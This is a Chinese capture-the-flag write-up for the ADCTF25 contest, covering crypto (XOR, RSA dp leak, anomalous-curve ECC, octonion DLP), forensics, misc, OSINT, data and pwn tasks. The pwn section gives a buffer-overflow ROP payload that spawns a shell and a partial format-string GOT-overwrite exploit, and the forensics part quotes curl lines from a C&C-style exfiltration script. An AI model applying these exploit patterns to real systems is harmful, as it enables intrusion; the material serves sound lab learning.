---
title: "ADCTF25-WP"
pubDate: "2025-12-02"
description: ""
tags: ["CTF"]
comments: true
math: true
---

## Crypto

### easy_encode1

#### 加密过程分析

经典且平凡的 XOR 加密

```python
for i, char in enumerate(plaintext.encode()):
  encrypted.append(char ^ key[i % key_length])
```

> `a = bytes.fromhex(encryptoed_hex)`

#### 密钥

目标是 `fiag{...}`

通过 XOR 分析计算密钥

```txt
key[0] = 'f'(102) ^ a[0](170) = 204
key[1] = 'l'(108) ^ a[1](63)  = 83
key[2] = 'a'(97)  ^ a[2](120) = 25
key[3] = 'g'(103) ^ a[3](223) = 184
key[4] = '{'(123) ^ a[4](122) = 1
```

```python
key = [204, 83, 25, 184, 1]
result = xor_decrypt(ciphertext, key)
```

```txt
fiag{s[d6]0[e3][ce][fe][e7][bf][8f]T[00]+[ca]D[11][8c][a8]l
```

包含大量非 ASCII 字符，说明密钥不完整。

```py
len(a) = 24
a[23] ^ ord('}') = 229
```

229 不在 key 前五中，那么一定在这之后；并且 `key.index(229)` 一定是 24 的因子
229 可能在 `[6,8,12,24]`；但是后面几个不太可能，猜测就是第六个

```python
key = [204, 83, 25, 184, 1, 229]
result = xor_decrypt(ciphertext, key)
print(result)
```

```txt
b'fiag{ZIzBw3QjdLty60CYCt}'
```

### rickypto

#### 前置知识

深入分析需要理解以下数学概念：

1. **n 维代数 (n-dimensional Algebra)**:
    n 维代数是在 n 维线性空间上定义加法和乘法运算的数学结构。实数构成 1 维代数，复数构成 2 维代数，八元数构成 8 维代数。代数结构保持了基本运算的封闭性和分配律。

2. **八元数 (Octonions)**:
    八元数 $\mathbb{O}$ 是实数域上的 8 维非结合代数。每个八元数可表示为 8 个实数分量的线性组合。八元数具有以下代数特征：
    - **非交换性**：$ab \neq ba$
    - **非结合性**：$(ab)c \neq a(bc)$

3. **幂结合性 (Power Associativity)**:
    八元数代数虽不满足一般结合律，但满足幂结合律。对任意八元数 $x$ 和正整数 $n$，幂运算 $x^n$ 的结果与计算顺序无关，即 $(xx)x = x(xx)$。该性质确保了八元数指数运算的良定义性。

4. **范数 (Norm)**:
    范数是度量代数元素大小的重要函数。对于八元数 $x = a_0 + a_1e_1 + \cdots + a_7e_7$，其范数定义为：
    $$N(x) = x\bar{x} = a_0^2 + a_1^2 + \cdots + a_7^2$$
    其中 $\bar{x}$ 为 $x$ 的共轭八元数。八元数范数具有关键性质：
    $$N(xy) = N(x)N(y)$$
    该乘性性质将高维八元数运算映射到一维标量域，是解构本题的核心工具。

5. **循环群和生成元 (Cyclic Group and Generator)**:
    设 $G$ 为有限群，若存在元素 $g \in G$ 使得 $G = \{g^k \mid k \in \mathbb{Z}\}$，则 $G$ 称为循环群，$g$ 称为生成元。循环群的阶等于其生成元的阶。

6. **离散对数问题 (Discrete Logarithm Problem, DLP)**:
    在循环群 $(G, \cdot)$ 中，给定生成元 $g$ 和元素 $h \in G$，求解整数 $x$ 使得 $g^x = h$ 的问题称为离散对数问题。该问题在密码学中具有重要意义，其计算复杂度随群大小的增长而指数级增加。对于 64 位模数，该问题可在多项式时间内求解。

#### 分析

##### `gen.py`

1. **初始化**: 生成一个 64 位的素数 `m`。
2. **数据分块**: 将 Flag 每 4 个字节分为一块，并将每块转换为整数 `n`（作为指数）。
3. **八元数代数 (Octonion Algebra)**: 在有限域 $\mathbb{Z}_m$ 上定义八元数代数。
4. **加密过程**:
    - 对于每个 Flag 块（指数 $n$），随机生成一个八元数 $p$。
    - 计算 $q = p^n$。
    - 公开 $m$、$p$ 的向量表示、$q$ 的向量表示。

题目要求我们解出 $p^n = q \pmod m$ 中的 $n$。这看似是一个在八元数代数上的离散对数问题（DLP）。八元数是非交换、非结合的，这通常会让计算变得复杂。

然而，八元数虽然非结合，但它是**幂结合**（Power Associative）的，这意味着 $p^n$ 是定义明确的。更重要的是，八元数拥有**范数（Norm）**，且范数是乘性的。即对于八元数 $x, y$，满足 $N(xy) = N(x)N(y)$。

利用这个性质，我们可以将八元数上的高维 DLP 降维到一维的标量域 $\mathbb{Z}_m$ 上：
$$N(q) = N(p^n) = N(p)^n \pmod m$$

令 $a = N(p) \pmod m$ 和 $b = N(q) \pmod m$，问题转化为求解：
$$a^n \equiv b \pmod m$$

这是一个标准的模 $m$ 离散对数问题。由于 $m$ 只有 64 位，使用 SageMath 的 `discrete_log` 函数可以在毫秒级内解出 $n$。

#### 攻击策略

1. 从 `output.txt` 中解析出 $m$, $p\_values$, $q\_values$。
2. 在 SageMath 中重建 $\mathbb{Z}_m$ 上的八元数代数。
3. 遍历每一对 $(p, q)$：
    - 计算 $p$ 的范数 $N(p)$。
    - 计算 $q$ 的范数 $N(q)$。
    - 求解离散对数 $n = \log_{N(p)} N(q) \pmod {m-1}$。
4. 将解得的 $n$ 转换为字节并拼接，得到 Flag。

#### 核心代码

```py
for i in range(len(p_values)):
    # 1. 将向量恢复为八元数对象
    P_vec = p_values[i]
    Q_vec = q_values[i]

    P = O(P_vec)
    Q = O(Q_vec)

    # 2. 计算范数 (Norm)
    # 因为 N(Q) = N(P^n) = N(P)^n mod m
    # 在模运算中，范数是各分量平方和模 m
    np_mod = Zmod(m)(sum(x*x for x in P_vec) % m)
    nq_mod = Zmod(m)(sum(x*x for x in Q_vec) % m)

    # 3. 求解离散对数 np^n = nq mod m
    # 注意：阶数不一定是 m-1，但在 Sage 中 discrete_log 会自动处理
    try:
        n = discrete_log(nq_mod, np_mod)
        chunk = long_to_bytes(int(n))
        flag += chunk
        print(f"Chunk {i+1}/{len(p_values)}: Found n={n}, chunk={chunk}")
    except ValueError:
        print(f"Chunk {i+1}: Failed to find log!")
```

### 这家伙在说什么呢？

#### 培根密码（Bacon Cipher）

本题使用了培根密码进行加密。培根密码是一种经典的替换密码，通过 5 位二进制序列来表示字母：

```txt
A = 00000    I = 01000    Q = 10000    Y = 11000
B = 00001    J = 01001    R = 10001    Z = 11001
C = 00010    K = 01010    S = 10010
D = 00011    L = 01011    T = 10011
E = 00100    M = 01100    U = 10100
F = 00101    N = 01101    V = 10101
G = 00110    O = 01110    W = 10110
H = 00111    P = 01111    X = 10111
```

#### 解密

```python
## Decode binary string using Bacon cipher
binary_groups = [
    "00101", "01011", "00000", "00110", "00011", "10100", "01101", "10010",
    "00111", "00000", "01101", "10010", "00111", "10100", "01110", "00011",
    "00100", "00011", "10100", "01000"
]

## Bacon cipher mapping (A=00000, B=00001, ..., Z=11001)
bacon_map = {}
for i in range(26):
    letter = chr(ord('A') + i)
    binary = format(i, '05b')
    bacon_map[binary] = letter

## Decode each group
result = ""
for group in binary_groups:
    if group in bacon_map:
        result += bacon_map[group]

## Format as flag
flag_content = result.lower().replace("flag", "")
print(f"Final flag: fiag{{{flag_content}}}")
```

```txt
fiag{dunshanshuodedui}
```

> 中文意思是"盾山说得对"，呼应了题目描述中盾山"叽里咕噜"说话的情景。

### codeforkk

cpp 的 hashmap 加了很多优化，但是还是有妙妙小数字可以突破他的优化。

```py
p = 20753
n = 20000
m = 20000
print(n)
print(' '.join(str(i * p) for i in range(1, n+1)))
print(m)
print(' '.join(str(p) for _ in range(m)))
```

### leak_dp

#### 分析

这是一道 RSA 加密题目，但泄露了重要的信息 `dp`。

```python
dp = d % (p - 1)
```

- `n`: RSA 模数
- `dp`: 私钥指数对 p-1 取模的结果
- `c`: 密文
- `e`: 公钥指数 (65537)

#### 漏洞原理

##### 什么是 dp？

在 RSA 中：

- `d`: 私钥
- `dp = d mod (p-1)`

这个 `dp` 的泄露给了我们一个重要的数学关系：

$$dp \cdot e \equiv 1 \pmod{p-1}$$

这意味着：

$$dp \cdot e - 1 = k \cdot (p-1)$$

对于某个整数 k

##### 攻击思路

1. 我们知道 `dp * e - 1` 必须是 `(p-1)` 的倍数
2. 因此 `(p-1)` 必须是 `dp * e - 1` 的一个因子
3. 我们可以通过尝试不同的 `k` 值来找到正确的 `p`

$$temp = dp * e - 1$$

我们需要找到整数 `k` 使得：

$$p = \frac{temp}{k} + 1$$

并且 `p` 满足：

1. 是素数
2. 能整除 `n` (即 `n % p == 0`)

一旦找到正确的 `p`：

1. 计算 `q = n / p`
2. 计算 `φ(n) = (p-1)(q-1)`
3. 计算 `d = e^(-1) mod φ(n)`
4. 验证 `d % (p-1) == dp`

然后解密：

$$m = c^d \bmod n$$

然后用 `flag = long_to_bytes(m)` 得到 flag

#### 代码实现

```python
from Crypto.Util.number import *
import gmpy2

n = 98523589166698215884772678597126381330729042409867906419776228376328394083113113810566361681776383135721618320266085382467318657506884467970213696370301053102178834366258554086282183236507513622996917266419984601116179992149604378946213411633778008170053460579973392211434938839020605646327849068116301554053
dp = 5138636274856700080941828013807156958082237286853007924695738133342859363355437998008259170260315338728640155874737284930133190696925369174593997368399761
c = 81387127961421902230857210411279023161773956760695301546933898924006410439044243629343875994387728788391446830661374802652363868007527718797900701113897594566288568833319705717842048295047236231759241072305294457689433087267810684045886576363621162635358100858319636959737626031693142150135828215563162557116
e = 65537

## 核心：从 dp 恢复 p
temp = dp * e - 1

## 寻找正确的 k
for k in range(1, 100000):
    if temp % k == 0:
        p_candidate = temp // k + 1
        if n % p_candidate == 0 and isPrime(p_candidate):
            p = p_candidate
            break

## 恢复其他参数
q = n // p
phi = (p - 1) * (q - 1)
d = gmpy2.invert(e, phi)

## 解密
m = pow(c, d, n)
flag = long_to_bytes(m)

print(f"Flag: {flag.decode()}")
```

```txt
Flag: fiag{qeem8obeyi5lcqedkw8w}
```

### Strange_ECC

#### 分析

题目给出的椭圆曲线参数满足阶数等于模数：
$$|E(\mathbb{F}_p)| = p$$

这是一条**异常椭圆曲线** (Anomalous Elliptic Curve)。此类曲线存在 **Smart Attack**，可以在多项式时间内解决 ECDLP。

#### 攻击

利用 SageMath 的 `discrete_log` 可以直接处理异常曲线的 DLP。

```python
## SageMath
F = GF(p)
E = EllipticCurve(F, [A, B])
G = E(Gx, Gy)
Q = E(Qx, Qy)

## 验证异常性
print(E.order() == p) # True

## Smart Attack 求解 d
d = G.discrete_log(Q)
print(d)
```

得到私钥：
`d = 61859534623601494462930656514060814065864458829849606574762191787997165697161`

#### 解密

加密逻辑为 `plaintext ^ SHA256(str(d))`。

```python
import hashlib

d = 61859534623601494462930656514060814065864458829849606574762191787997165697161
ct_hex = "a81846ee8f1e03434dc437040b858207d265dff9b573341854b893f391068f7dfd1611bac400"

key = hashlib.sha256(str(d).encode()).digest()
ct = bytes.fromhex(ct_hex)

flag = bytes([c ^ key[i % len(key)] for i, c in enumerate(ct)])
print(flag.decode())
```

```txt
fiag{ce742789f47d667479f6003c32e3b630}
```

## Forensic

### 原神，启动

#### 流量分析

这是一个流量分析题目。首先通过 `tshark` 提取 HTTP 对象：

```bash
tshark -r its-genshin-time.pcap --export-objects http,extracted_files/
```

提取得到恶意脚本 `5cr1p7` 、Config 数据 `c0nfi9ur@t1on` 和加密数据 `%2f`。

#### 加密逻辑分析

分析 `5cr1p7` 脚本，发现其从 C&C 服务器获取配置，并使用自定义 Base64 上传数据。

##### flag 在 `challenge.secret.info` 项内

```sh
JSON_PAYLOAD="$JSON_PAYLOAD\"challenge.secret.info\": \"$SECRET_INFO\","
```

##### `c0nfi9ur@t1on` 的内容被用来生成码表

```sh
curl -s -L "$CONFIG_URL" -o "$CONFIG_PATH"

HEX_CONTENT=$(cat "$CONFIG_PATH")
TMP_STRING=$(echo "$HEX_CONTENT" | xxd -r -p)
DECODED_WITH_PREFIX=$(echo "$TMP_STRING" | tr '!-~' 'P-~!-O')
CUSTOM_ALPHABET=$(echo "$DECODED_WITH_PREFIX" | cut -d' ' -f2-)
```

```bash
echo "2570717b7469206522445a2137486074294a3c6664777e613e763d2a3271454b2b49393b684063385e7b273f7d34234373467a78413370622826425f36677c35722524753a4779" | xxd -r -p | tr '!-~' 'P-~!-O' | cut -d' ' -f2-
```

得到自定义 Base64 码表：
`6Qs+Pfw1EXyk75HO2mGlYaBtzZxhj9o4g/LVnNcRrDuKIpbA3WUq0e8MdCTSFivJ`

#### 解密 Payload

编写脚本解密 `%2f` 文件内容：

```python
import base64
import json

custom_alphabet = "6Qs+Pfw1EXyk75HO2mGlYaBtzZxhj9o4g/LVnNcRrDuKIpbA3WUq0e8MdCTSFivJ"
standard_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
trans = str.maketrans(custom_alphabet, standard_alphabet)

with open("extracted_files/%2f", "r") as f:
    payload = f.read().strip()

## 替换码表并补全 padding
std_payload = payload.translate(trans)
std_payload += '=' * ((4 - len(std_payload) % 4) % 4)

data = json.loads(base64.b64decode(std_payload))
print(data['challenge.secret.info'])
```

```txt
fiag{M@G15K-moDU1e-cAn-bE-riskYyyyy-5O_bE-CaRefu1-WHeN_iN5T4LI1Ng_lT}
```

## Misc

### BaseHajimi

根据题目 `BaseXXX` 和题面预测是 Base8

#### 建立映射关系

`fiag{`: `01100110 01101100 01100001 01100111 01111011`

三位一组可以得到：

```txt
['011', '001', '100', '110', '110', '001', '100', '001', '011', '001', '110', '111', '101', '1']
```

转换为八进制：

```txt
[3, 1, 4, 6, 6, 1, 4, 1, 3, 1, 6, 7, 5, ?]
['米', '豆', '哈', '哦', '哦', '豆', '哈', '豆', '米', '豆', '哦', '北', '南']

[3, 1, 4, 6, 7, 5]
['米', '豆', '哈', '哦', '北', '南']
```

这里已经出来了 6 个，还剩下两种可能，直接枚举一下即可

```py
mapping = {
    '基': 0, '豆': 1, '绿': 2, '米': 3,
    '哈': 4, '南': 5, '哦': 6, '北': 7
}

encoded_str = "米豆哈哦哦豆哈豆米豆哦北南南基绿豆南基北豆哈哦米绿绿基哈基豆南绿豆哈绿哦哦南南豆豆米绿哈哈哈哦南绿北哦哈基南南哦绿北哦米绿豆绿北豆哈哦北豆南豆北绿米绿米豆哈南南绿米绿米基豆基哈米米基哈米豆南豆米豆绿哦绿豆米北米基哈哈基豆绿米豆哈哦绿哦南哈米绿绿绿北基豆南基米豆绿北豆基哈豆豆基绿绿基南北南"

octal_values = [mapping[char] for char in encoded_str]
binary_str = "".join(f"{val:03b}" for val in octal_values)

flag = ""
for i in range(0, len(binary_str), 8):
    byte = binary_str[i:i+8]
    if len(byte) == 8:
        flag += chr(int(byte, 2))

print(flag)
```

### フラッグモザイク

#### 分析

```bash
exiftool image.tif
```

```txt
Page Count: 4
```

发现这是一个多页 TIFF 文件，包含 4 个页面：

```bash
tiffinfo image.tif
```

```txt
=== TIFF directory 2 ===
...
PageName: flag
```

第 2 页名为"flag"，提取一下

```bash
magick "image.tif[2]" alpha-2.png
```

在`alpha-2.png`中发现 flag，扔给 OCR 或者 AI（注意 0 和 O 容易混）

### 知识问答

直接复制扔给 AI 出答案填进去😋

### 调查问卷

啦啦啦～

### RickyLang 杨辉三角

#### 分析

（用 xmake 跑了一次 build 提示我没有 llvm 但其实我有，然后我就懒得继续弄了，反正可以 remote build，然后我就抓包然后让 AI 写了一个脚本自动传云端 build 然后获取结果）

##### 特质

- 变量不可变（immutable）
- 控制结构不完整（while、比较操作符）
- extern io lib
- 支持内联 LLVM IR 汇编：`function() -> Type = asm { ... }`

#### 核心思路

简单阅读源码发现很多语言细节是没有实现的，但是关键的有两点：

1. 基于 llvm ir
2. 可以通过 `asm{}` block 直接写 llvm ir

不难猜测比较优雅的实现方式是使用 llvm ir 来实现那些没有实现的特性。
但是我懒得弄了，直接让 AI 用 llvm ir 实现了全部内容；写的代码真的难看死了。。。

#### 实现

```txt
putchar: (c: Int) -> Int;
getchar: () -> Int;

main: () -> Int = asm {
entry:
  %c1 = call i32 @getchar()
  %c2 = call i32 @getchar()
  %d1 = sub i32 %c1, 48
  %d2 = sub i32 %c2, 48
  %is_digit = icmp uge i32 %c2, 48
  %is_digit_end = icmp ule i32 %c2, 57
  %c2_is_digit = and i1 %is_digit, %is_digit_end
  %temp = mul i32 %d1, 10
  %two_digit = add i32 %temp, %d2
  %n = select i1 %c2_is_digit, i32 %two_digit, i32 %d1

  ; Start with row 0
  br label %row_loop

row_loop:
  %r = phi i32 [0, %entry], [%r_next, %row_done]
  %cmp_done = icmp eq i32 %r, %n
  br i1 %cmp_done, label %program_done, label %col_start

col_start:
  ; Start each row with k=0 and coefficient=1
  br label %col_loop

col_loop:
  %k = phi i32 [0, %col_start], [%k_next, %next_col]
  %coeff = phi i32 [1, %col_start], [%coeff_next, %next_col]

  ; Check if k > r (end of row)
  %cmp_end = icmp ugt i32 %k, %r
  br i1 %cmp_end, label %row_done, label %print_number

print_number:
  ; Handle 0 as special case
  %is_zero = icmp eq i32 %coeff, 0
  br i1 %is_zero, label %print_zero, label %check_single_digit

print_zero:
  call i32 @putchar(i32 48)  ; Print '0'
  br label %check_space

check_single_digit:
  %is_single = icmp ult i32 %coeff, 10
  br i1 %is_single, label %print_single, label %print_multi

print_single:
  %char = add i32 %coeff, 48
  call i32 @putchar(i32 %char)
  br label %check_space

print_multi:
  ; For multi-digit numbers, extract and print digits
  %buf = alloca [12 x i32]
  br label %extract_loop

extract_loop:
  %val = phi i32 [%coeff, %print_multi], [%val_div, %extract_continue]
  %idx = phi i32 [0, %print_multi], [%idx_next, %extract_continue]
  %cmp_zero = icmp eq i32 %val, 0
  br i1 %cmp_zero, label %print_digits, label %extract_continue

extract_continue:
  %digit = urem i32 %val, 10
  %ptr = getelementptr [12 x i32], [12 x i32]* %buf, i32 0, i32 %idx
  store i32 %digit, i32* %ptr
  %val_div = udiv i32 %val, 10
  %idx_next = add i32 %idx, 1
  br label %extract_loop

print_digits:
  %digit_count = phi i32 [%idx, %extract_loop]
  %start_idx = sub i32 %digit_count, 1
  br label %print_digit_loop

print_digit_loop:
  %print_idx = phi i32 [%start_idx, %print_digits], [%print_idx_next, %print_digit_loop]
  %digit_ptr = getelementptr [12 x i32], [12 x i32]* %buf, i32 0, i32 %print_idx
  %digit_val = load i32, i32* %digit_ptr
  %char_val = add i32 %digit_val, 48
  call i32 @putchar(i32 %char_val)
  %print_idx_next = sub i32 %print_idx, 1
  %print_done = icmp eq i32 %print_idx_next, -1
  br i1 %print_done, label %check_space, label %print_digit_loop

check_space:
  ; Check if this is the last element in the row
  %is_last = icmp eq i32 %k, %r
  br i1 %is_last, label %next_col, label %print_space_char

print_space_char:
  call i32 @putchar(i32 32)  ; Print space
  br label %next_col

next_col:
  ; Calculate next coefficient: coeff * (r - k) / (k + 1)
  %diff = sub i32 %r, %k
  %numerator = mul i32 %coeff, %diff
  %denominator = add i32 %k, 1
  %coeff_next = udiv i32 %numerator, %denominator
  %k_next = add i32 %k, 1
  br label %col_loop

row_done:
  call i32 @putchar(i32 10)  ; Print newline
  %r_next = add i32 %r, 1
  br label %row_loop

program_done:
  ret i32 0
}
```

#### 补充

###### phi 指令说明

`phi` 指令用于在控制流汇合点选择不同前驱块的值：

- `%r = phi i32 [0, %entry], [%r_next, %row_done]` 表示：
  - 如果来自 `%entry` 块，`%r` 取值 `0`
  - 如果来自 `%row_done` 块，`%r` 取值 `%r_next`
- 实现了变量在不同循环迭代间的状态传递

##### 输入解析

```llvm
; 读取输入并处理一位数/两位数
entry:
  %c1 = call i32 @getchar()
  %c2 = call i32 @getchar()
  %d1 = sub i32 %c1, 48
  %d2 = sub i32 %c2, 48

  ; 检查第二个字符是否为数字
  %is_digit = icmp uge i32 %c2, 48
  %is_digit_end = icmp ule i32 %c2, 57
  %c2_is_digit = and i1 %is_digit, %is_digit_end

  ; 如果是两位数则计算，否则只使用第一位
  %temp = mul i32 %d1, 10
  %two_digit = add i32 %temp, %d2
  %n = select i1 %c2_is_digit, i32 %two_digit, i32 %d1
```

##### 杨辉三角递推算法

```llvm
; 外层循环：控制行数 (0到n-1)
row_loop:
  %r = phi i32 [0, %entry], [%r_next, %row_done]
  %cmp_done = icmp eq i32 %r, %n
  br i1 %cmp_done, label %program_done, label %col_start

; 内层循环：计算并打印每行的组合数
col_loop:
  %k = phi i32 [0, %col_start], [%k_next, %next_col]    ; 循环索引
  %coeff = phi i32 [1, %col_start], [%coeff_next, %next_col]  ; 组合数值

  ; 检查是否到达行尾
  %cmp_end = icmp ugt i32 %k, %r
  br i1 %cmp_end, label %row_done, label %print_number

; 组合数递推公式：C(r,k+1) = C(r,k) * (r-k) / (k+1)
next_col:
  %diff = sub i32 %r, %k
  %numerator = mul i32 %coeff, %diff
  %denominator = add i32 %k, 1
  %coeff_next = udiv i32 %numerator, %denominator
  %k_next = add i32 %k, 1
  br label %col_loop
```

##### 多位数打印策略

```llvm
; 根据数字位数选择打印方式
print_number:
  %is_zero = icmp eq i32 %coeff, 0
  br i1 %is_zero, label %print_zero, label %check_single_digit

; 单位数直接转换
print_single:
  %char = add i32 %coeff, 48
  call i32 @putchar(i32 %char)
  br label %check_space

; 多位数分解处理
print_multi:
  %buf = alloca [12 x i32]
  br label %extract_loop

; 数字分解：从个位开始提取
extract_continue:
  %digit = urem i32 %val, 10
  %ptr = getelementptr [12 x i32], [12 x i32]* %buf, i32 0, i32 %idx
  store i32 %digit, i32* %ptr
  %val_div = udiv i32 %val, 10
  %idx_next = add i32 %idx, 1
  br label %extract_loop

; 反向打印：从最高位开始输出
print_digit_loop:
  %digit_val = load i32, i32* %digit_ptr
  %char_val = add i32 %digit_val, 48
  call i32 @putchar(i32 %char_val)
```

### 欢迎来到我的 Github Profile

#### 分析

> 一直被仓库里面的那个 issue 干扰，😁

账号 24 年创建，23 年却有提交；结合网上有刷 commit 来自定义热力图图形的项目可知 flag 就在这里。

使用 api 提取 23 年的贡献数据

<https://github-contributions-api.jogruber.de/v4/Luminoria>

筛选 + 处理得到以下数据

```txt
[0, 0, 0, 0, 0, 0, 0, 1, 3, 1, 3, 1, 3, 6, 0, 1, 3, 0, 1, 1, 3, 1, 6, 1, 6, 3, 6, 1, 3, 1, 6, 1, 3, 3, 1, 1, 6, 1, 0, 1, 3, 3, 0, 1, 1, 1, 1, 1, 3, 0, 3, 0, 3, 6, 1, 1, 3, 0, 6, 0, 6, 0, 0, 1, 3, 6, 3, 1, 6, 1, 0, 1, 1, 0, 3, 1, 3, 6, 0, 1, 3, 0, 3, 1, 6, 1, 1, 1, 1, 1, 0, 0, 6, 0, 1, 0, 6, 0, 0, 1, 0, 6, 3, 1, 1, 0, 6, 0, 3, 6, 1, 1, 0, 0, 6, 1, 0, 0, 0, 1, 3, 6, 3, 1, 1, 6, 6, 1, 0, 0, 3, 1, 3, 1, 1, 0, 3, 6, 1, 1, 6, 1, 3, 0, 6, 0, 1, 0, 6, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 6, 0, 1, 0, 6, 0, 1, 1, 3, 1, 0, 3, 6, 1, 1, 1, 0, 6, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 6, 3, 0, 3, 6, 1, 1, 0, 6, 6, 1, 3, 6, 3, 1, 1, 6, 6, 1, 1, 1, 0, 1, 0, 3, 0, 1, 0, 1, 1, 0, 3, 6, 1, 1, 1, 0, 0, 1, 6, 0, 3, 0, 6, 0, 0, 1, 3, 1, 3, 1, 3, 3, 1, 1, 0, 6, 0, 0, 6, 0, 6, 1, 6, 6, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
```

AI 分析：<https://grok.com/share/c2hhcmQtMi1jb3B5_07d94dbc-90b6-4318-b27f-51dfcd1761e6>

有 4 个数字（0, 1, 3, 6）

- `0` → `00`
- `1` → `01`
- `3` → `10`
- `6` → `11`

拼接，然后 long to bytes

## OSINT

### Neko Q&A

1. 根据图片内容的标识文字
   搜索 2025 good smile miku 上海
   <https://x.com/goodsmileracing/status/1968190562525385006>

2. AI 直出：<https://gemini.google.com/share/31ba5550cc4c>

3. <https://baike.baidu.com/item/%E5%9C%86%E8%9E%8D%E6%97%B6%E4%BB%A3%E5%B9%BF%E5%9C%BA/920397>

### 广工问答

<https://grok.com/share/c2hhcmQtMi1jb3B5_72fa03c3-ecf3-43ac-be0e-6d56f0613ac3>

1. <https://nic.gdut.edu.cn/search_list.jsp?wbtreeid=1322> 搜索 广东工业大学网络安全技能大赛
2. <https://bwc.gdut.edu.cn/info/1101/3775.htm>
3. SULCMIS-OPAC 4.01。该信息来源于图书馆 OPAC 平台的版权声明，可通过以下链接查看页面底部 footer 确认
4. <https://www.gdut.edu.cn/info/1709/23208.htm>

## DS

### Plain HTTP Data

#### 流量分析

使用 `tshark` 分析 HTTP POST 请求：

```bash
tshark -r "Plain-HTTP-Data.pcapng" -Y "http.request.method == POST" -T fields -e http.request.uri
```

发现所有 POST 请求都发往 `/verify` 端点，内容类型为 `application/json`。

#### 数据提取

提取 JSON 数据：

```bash
tshark -r "Plain-HTTP-Data.pcapng" -Y "http.request.method == POST" -T fields -e json.object
```

数据格式：

```json
{
  "name": "杜志强",
  "gender": "女",
  "id": "120116198904050546",
  "phone_number": "15366341576",
  "address": "河南省丽华市蓟州西宁街 J 座",
  "email": "huwei@example.net"
}
```

#### CSV 构建

创建 CSV 文件头：

```bash
echo "name,gender,id,phone_number,address,email" > employees.csv
```

使用 `jq` 转换 JSON 为 CSV：

```bash
tshark -r "Plain-HTTP-Data.pcapng" -Y "http.request.method == POST" -T fields -e json.object | \
jq -r '[.name, .gender, .id, .phone_number, .address, .email] | @csv' >> employees.csv
```

### 找回订单

#### 日志分析

定位关键数据位置：

```bash
grep -n "INSERT INTO" query.log
```

忽略无用信息，主要到最底部的重要信息：

```txt
32533:INSERT INTO users (username, email, department, created_at) VALUES
32563:INSERT INTO products (name, price, stock, created_at) VALUES
32583:INSERT INTO orders (id, user_id, product_id, quantity, status, created_at) VALUES
```

#### 数据结构分析

寻找并查看相应的表：

##### Users

```sql
INSERT INTO users (username, email, department, created_at) VALUES
('张伟', 'zhangwei@adctf.org', '研发部', '2024-01-01 09:00:00'),
```

##### Products

```sql
INSERT INTO products (name, price, stock, created_at) VALUES
('ADLab 云服务器 M1', 2999.00, 50, '2025-02-01 00:00:00'),
```

##### Orders

```sql
INSERT INTO orders (id, user_id, product_id, quantity, status, created_at) VALUES
(1, 4, 10, 2, 'completed', '2024-01-01 10:00:00'),
...
```

订单通过 `user_id` 和 `product_id` 关联

我们解析 orders，然后对照着填补上对应的 user 和 product 信息 即可。

#### 数据提取脚本

```python
##!/usr/bin/env python3
import re, csv

with open('query.log', 'r', encoding='utf-8') as f:
    log = f.read()

## 提取用户名（只取第一个字段）
users_match = re.search(r"INSERT INTO users.*?VALUES\n((?:\([^)]+\),?\n?)*)", log, re.DOTALL)
users = {i: name for i, name in enumerate(
    re.findall(r"\('([^']+)'", users_match.group(1)), 1
)}

## 提取产品名（只取第一个字段）
products_match = re.search(r"INSERT INTO products.*?VALUES\n((?:\([^)]+\),?\n?)*)", log, re.DOTALL)
products = {i: name for i, name in enumerate(
    re.findall(r"\('([^']+)'", products_match.group(1)), 1
)}

## 提取订单（所有 6 个字段）
orders_match = re.search(r"INSERT INTO orders.*?VALUES\n((?:\([^)]+\),?\n?)*)", log, re.DOTALL)
orders = re.findall(
    r"\((\d+),\s*(\d+),\s*(\d+),\s*(\d+),\s*'([^']+)',\s*'([^']+)'\)",
    orders_match.group(1)
)

## 生成 CSV
with open('recovered_orders.csv', 'w', encoding='utf-8', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['username', 'product', 'quantity', 'status', 'created_at'])
    for oid, uid, pid, qty, status, time in sorted(orders, key=lambda x: int(x[0])):
        writer.writerow([
            users[int(uid)], products[int(pid)], qty, status, time
        ])

print(f"用户：{len(users)}, 产品：{len(products)}, 订单：{len(orders)}")
```

## Pwn

### checkin

<https://grok.com/share/c2hhcmQtMi1jb3B5_07861ba3-cd58-4984-9ddc-8840e3669433>

扔进 ninja binary 分析一下发现：

经典 gets pwn

```c
0040120c    char* vulnerable()
00401222        puts(str: "Build your chain:")
0040123a        char buf[0x30]
0040123a        return gets(&buf)
```

shell 在：

```c
004011f2    int64_t get_shell()
0040120b        return system(line: "m +,m1*BB")
```

但是显然没这么简单，分析一下这个 神秘小字符串`"m +,m1*BB"`

```c
00401196    int64_t decrypt_cmd()
004011ac        int64_t result = puts(str: "Decryption routine activated")
004011ac
004011ec        for (int32_t i = 0; i s<= 7; i += 1)
004011d8            result = sx.q(i)
004011e1            (*"m +,m1*BB")[result] = (*"m +,m1*BB")[sx.q(i)] ^ (*"B")[0]
004011e1
004011f1        return result
```

他处理了常量区域的这个字符串，解密结果是 `/bin/sh\0B`

那我们需要先跳到解密这里，然后跳到 get_shell

```py
payload = b'A' * 56
payload += p64(decrypt_cmd)
payload += p64(get_shell)
```

### 井字棋

<https://gemini.google.com/share/ecb3495d66a1>

#### 思路

```c
08049d3c        printf(format: ">>> ")
08049d4f        char var_78[0x64]
08049d4f        read(fd: 0, buf: &var_78, nbytes: 0x64)
08049d61        printf(format: 0x804a28c)
08049d70        printf(format: &var_78)
08049d7d        exit(status: 0)
```

这里 read 了 stdin，覆盖 `exit@GOT` 为 `win()`

#### EXP

```python
##!/usr/bin/env python3
from pwn import *

elf = ELF('./chal')
WIN_ADDR = elf.symbols['win']
EXIT_GOT = elf.got['exit']

p = remote(REMOTE)

## 构造格式化字符串 payload
writes = {EXIT_GOT: WIN_ADDR}
